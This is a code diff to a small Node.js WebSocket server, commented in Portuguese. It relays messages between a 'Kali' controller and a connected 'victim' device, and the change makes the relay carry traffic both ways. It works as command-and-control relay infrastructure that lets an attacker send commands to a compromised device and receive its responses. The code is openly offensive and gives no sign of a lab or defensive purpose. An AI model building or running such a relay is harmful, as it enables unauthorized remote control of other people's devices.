@@ -7,34 +7,31 @@ let kali = null;
 let victim = null;
 
 wss.on('connection', (ws, req) => {
-    // Identifica quem está conectando pela URL
-    const type = req.url; 
+    const url = req.url.toLowerCase(); 
+    console.log(`Nova tentativa de conexão: ${url}`);
 
-    if (type === '/kali') {
+    if (url.includes('kali')) {
         kali = ws;
-        console.log("Controlador Kali conectado.");
+        console.log("SISTEMA: Controlador Kali Online.");
     } else {
         victim = ws;
-        console.log("Vítima conectada.");
-        
-        // Ponte: Tudo que a Vítima manda, vai para o Kali
-        victim.on('message', (data) => {
-            if (kali && kali.readyState === WebSocket.OPEN) {
-                kali.send(data);
-            }
-        });
+        console.log("SISTEMA: Dispositivo Alvo conectado.");
     }
 
-    // Ponte: Tudo que o Kali manda, vai para a Vítima
     ws.on('message', (data) => {
+        // Se for o Kali mandando, vai para a vítima
         if (ws === kali && victim && victim.readyState === WebSocket.OPEN) {
             victim.send(data);
+        } 
+        // Se for a Vítima mandando, vai para o Kali
+        else if (ws === victim && kali && kali.readyState === WebSocket.OPEN) {
+            kali.send(data);
         }
     });
 
     ws.on('close', () => {
-        if (ws === kali) kali = null;
-        if (ws === victim) victim = null;
+        if (ws === kali) { console.log("Kali desconectou."); kali = null; }
+        if (ws === victim) { console.log("Vítima desconectou."); victim = null; }
     });
 });
 
